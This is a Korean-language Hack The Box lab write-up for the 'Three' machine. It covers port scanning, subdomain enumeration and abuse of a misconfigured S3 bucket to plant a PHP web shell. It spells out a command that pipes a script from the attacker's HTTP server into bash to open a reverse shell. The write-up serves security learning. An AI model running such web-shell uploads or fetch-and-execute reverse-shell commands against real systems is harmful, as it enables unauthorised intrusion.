---
title: three Write-up
parent: Hack The Box
nav_order: 2
---

# Three Write-up

## 머신 소개

AWS S3 버킷의 설정 오류를 활용한 클라우드 기반 취약점 공격의 개념을 배울 수 있는 머신이다.

## 사용되는 툴


- Nmap
- awscli
- gobuster

## Write-up
<br>
### 1.Port Scan
<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/1_포트스캔.png' | relative_url }}" style="width:600px;">
    <figcaption>포트 스캔</figcaption>
</figure>

먼저 대상 시스템의 모든 포트 대상으로 서비스 버전 탐지 스캔을 한다.

22번 포트에서 ssh, 80번 포트에서 웹 서비스를 하고 있다는 것을 알았다.
<br><br>
### 2.Website Enumeration
<br>
웹 서비스를 하고 있으므로 웹 사이트에 접속해본다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/2_웹접속.png' | relative_url }}" style="width:600px;">
    <figcaption>웹 사이트 접속</figcaption>
</figure>
<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/4_웹열거.png' | relative_url }}" style="width:600px;">
    <figcaption>웹 사이트 열거</figcaption>
</figure>
<br>
웹 사이트를 살펴보면 CONTACT 섹션에 thetoppers.htb 도메인 정보를 얻을 수 있다.
<br>
<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/3_코드분석.png' | relative_url }}" style="width:600px;">
    <figcaption>소스코드</figcaption>
</figure>

또한 웹 페이지의 소스코드를 살펴보면 폼 제출 시 /action_page.php 로 전송된다는 정보, 즉 백엔드가 php로 짜여져있다는 것을 알게 되었다.
<br><br>
### 3. 도메인 매핑
<br>
서브 도메인이나 command injection 공격을 위해 도메인 매핑을 해주어야 한다.
> 서브 도메인 <br>
> 웹 사이트 도메인 이름의 시작 부분에 추가되는 추가 정보
> 웹 사이트가 특정 기능을 위해 콘텐츠를 분리하는 기능을 한다

<br>

<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/5_도메인매핑.png' | relative_url }}" style="width:600px;">
    <figcaption>도메인 매핑</figcaption>
</figure>
<br>
### 4. 서브 도메인 스캔
<br>
이제 서브 도메인 스캔을 해보자

> gobuster vhost -w ~/seclist/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/6_gobuster.png' | relative_url }}" style="width:600px;">
    <figcaption>gobuster</figcaption>
</figure>

스캔 결과로

> s3.thetoppers.htb<br>gc._msdcs.thetoppers.htb
두 가지의 서브 도메인들이 나왔다.

이 중 s3.thetoppers.htb 서브 도메인은 404(Not Found) 응답을 반환한 것을 봐서 도메인 매핑을 해줘야 한다는 것을 생각할 수 있다.
<br><br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/7_도메인매핑.png' | relative_url }}" style="width:600px;">
    <figcaption>도메인 매핑</figcaption>
</figure>

<br>
그럼 이제 해당 서브 도메인 주소로 접속해보자
<br><br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/8_웹접속.png' | relative_url }}" style="width:300px;">
    <figcaption>서브 도메인 접속</figcaption>
</figure>
<br>

> s3 서브 도메인이란?<br>
클라우드 기반 객체 저장 서비스로, 버킷이라는 컨테이너에 데이터를 저장한다.
<br><br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/10_버킷나열.png' | relative_url }}" style="width:500px;">
    <figcaption>버킷 나열</figcaption>
</figure>
> s3.thetoppers.htb 서버에 존재하는 s3 버킷을 나열하라는 명령어

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/9_하위객체나열.png' | relative_url }}" style="width:500px;">
    <figcaption>하위객체 나열</figcaption>
</figure>
> s3.thetoppers.htb 서버에 존재하는 thetoppers.htb라는 s3 버킷의 객체를 보여달라는 명령어
<br>
해당 버킷에서 images, .htaccess, index.php 객체가 발견됐으므로 웹 루트라는 것을 유추할 수 있다.
> .htaccess
> Apache 웹 서버에서 사용하는 설정 파일로 웹 루트에 위치하며 리다이렉션, 인증설정, 접근제어를 설정하는 데 사용된다.

<br><br>

### 5. 쉘 파일 업로드
<br>
awscli에는 로컬 파일을 원격 버킷으로 복사하는 기능이 있다.

그 기능을 이용해서 간단한 쉘 파일을 업로드 해본다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/11_쉘파일.png' | relative_url }}" style="width:500px;">
    <figcaption>php 쉘 파일</figcaption>
</figure>
<br>

우선 간단한 쉘 파일을 만들었으니 thetoppers.htb s3 버킷에 업로드 한다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/12_쉘업로드.png' | relative_url }}" style="width:600px;">
    <figcaption>쉘 업로드</figcaption>
</figure>
<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/13_쉘업로드확인.png' | relative_url }}" style="width:500px;">
    <figcaption>쉘 업로드 확인</figcaption>
</figure>
<br>

쉘이 업로드 된 것을 확인했다.
이번엔 쉘 세션을 얻기 위해 리버스 쉘을 업로드 해보자
<br><br><br>
### 6. 리버스 쉘로 세션 획득
<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/14_리버스쉘.png' | relative_url }}" style="width:500px;">
    <figcaption>리버스 쉘</figcaption>
</figure>


<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/15_포트오픈.png' | relative_url }}" style="width:300px;">
    <figcaption>포트 오픈</figcaption>
</figure>
<br>
공격자의 IP 주소로 설정하고 임의의 포트번호(1234)로 접속해오도록 포트를 열어두었다.
<br>
<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/16_리버스쉘업로드.png' | relative_url }}" style="width:600px;">
    <figcaption>리버스 쉘 업로드</figcaption>
</figure>
<br>
웹 서버에 업로드 해놓은 웹 쉘로 나의 로컬 HTTP 서버 안의 파일을 다운받아야 하기 때문에 /var/www/html 디렉터리로 복사한 후 실행 권한까지 주었다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/17_http서버오픈.png' | relative_url }}" style="width:600px;">
    <figcaption>http 서버 오픈</figcaption>
</figure>
<br>

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/18_리버스쉘실행.png' | relative_url }}" style="width:600px;">
    <figcaption>리버스 쉘 다운&실행</figcaption>
</figure>
<br>

> curl 10.10.15.45:8000/revshell.sh\|bash<br>

공격자의 HTTP 서버에 접속해서 revshell.sh 파일을 다운받고 바로 실행한다.

그럼 전에 열어둔 1234번 포트로 리버스 쉘 연결이 이루어지고 공격자는 쉘 세션을 획득할 수 있게 된다.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/19_리버스쉘실행2.png' | relative_url }}" style="width:600px;">
    <figcaption>리버스 쉘 세션 획득</figcaption>
</figure>
<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/three/20_flag.png' | relative_url }}" style="width:500px;">
    <figcaption>flag 획득</figcaption>
</figure>
<br>
이로써 리버스 쉘을 이용한 쉘 세션 획득, 이어서 flag 획득에 성공했다.